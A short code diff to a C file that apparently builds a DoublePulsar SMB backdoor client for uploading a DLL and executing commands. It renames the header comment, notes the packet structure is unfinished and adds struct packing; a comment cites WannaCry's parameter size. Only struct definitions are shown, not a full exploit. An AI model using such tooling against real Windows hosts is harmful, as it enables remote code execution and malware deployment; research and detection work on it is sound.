@@ -1,9 +1,8 @@
 #define _CRT_SECURE_NO_WARNINGS
 /*
-WARNING: This code is NOT finished and WILL NOT work as of August 4 2020
+DoublePulsar Upload DLL and Execute command using a structure.
 
-2021 UPDATE: CODE UPDATED on 16/3/2021 but not tested yet
-
+Structure is not finished yet, need to add the NetBIOS header & add code to populate the length field.
 */
 
 #include <windows.h>
@@ -75,6 +74,7 @@ SESSION_SETUP Parameters:
 d1 c9 10 17 d9 aa 40 17 d9 da 69 17
 */
 
+#pragma pack(1)
 typedef struct {
 	uint16 SmbMessageType; //0x00
 	uint16 SmbMessageLength; 
@@ -115,6 +115,7 @@ typedef struct {
 	char SESSION_DATA_PARAMETERS[12]; //Wannacry uses 12 as the size
 	char payload[4096];
 } SMB_COM_TRANSACTION2_STRUCT;
+#pragma pack(pop)
 
 /*
 	Sample SESSION_SETUP parameter values:
